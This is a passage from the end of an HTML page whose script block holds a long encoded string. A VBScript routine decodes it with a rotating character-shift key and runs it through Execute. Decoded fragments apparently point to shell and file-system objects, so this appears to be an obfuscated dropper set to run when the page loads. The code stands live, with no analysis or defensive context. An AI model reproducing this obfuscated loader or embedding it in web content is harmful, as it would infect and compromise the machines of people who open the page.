?ilb7+MiD^h=q_Mlkch_o\=jE` N_eiHoe79l]Eb^=q_Mlkch_%c&)#p\;kF`C^N_eiHoe7)1N`^hp\;kF`N]fjHmf7,.p\;kF`?f]C^ n[=lD_ M_gh<b[j7;alL^gjFng#E_q:ll bGg].!o\=jE` C`M_gh<b[j7;al*1#La_h pZ<lF^L^gj;a[l6pZ<lp\;kF`?dl_C^N_ei=bYk7<bl +3#Mb_f n[=lD_ M_gh<b[j7n[F` pZ<lF^=g^A_o\=jE` NbalN_pm7MbckM_rl L^gj;a[l pZ<lF^F^rn#pZ<lF^ >r_[nn_ MbckM_rlMbckM_rl7>r_Kmlcf`7N]fjMlkch_ BneeN_pm75m[kcjlf[f`o[_^7pZl]lain8 n[=lD_ ^i[ng_fm(qjbn_  5^aomlrf_5 jikbncgg4[Zlifmm_5e_`l3*jp4ngi4*hq5ob^n`3*jp4b]babl3*jp4t%bh^]q4,04palc\aecnq3ba]^_f 84 ;HIF?LH;E>7EB Yam^mnA?C?AN7(QC<MB7(]i\^7]gf(gk'[[mcp]Q(;[mcp] R=gfjif^hn6 6':JJD>N8 5)\bp8p\;kF`4 )m[kcjl7p\;kF`4 m]jbjne[h_n[a]6p\k\lchm8pZ<lF^ LacmL^rnpZ<lF^ MgFi[dMnj n[=lD_ 6'l]lain8 n[=lD_ 6';I>Q7p\;kF`4 )BLFF8PZlN_pm7MbckM_rl n[=lD_ NhFg\eMlk o\=jE`EBXmnYkn!ObhJYmb5@MG'A_lLj_[b[f>hf^]k*! UB` ?MI&?cf]>rckmmObhJYmbq][V@ge^_j'bnl##Mb_f@KH(=gis@ae_ObhJYmbq][V@ge^_j'bnl&QagJ[la q_ZUedoZff&`c`?f]C^C^@KH(@ae_?pbmnk!QcfI[n` lsml^g-*U^_kdnih'cha##Mb_f@KH(=gis@ae_ObhJYmbmqln_e,,V\^melhj(agc$PchHZnbkrmn]f-,TddqYef(_b`?h\C`?h\@of\ncgg"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 6"&vbCrLf&"KeyArr(1) = 6"&vbCrLf&"KeyArr(2) = 8"&vbCrLf&"KeyArr(3) = 7"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</body>
</HTML>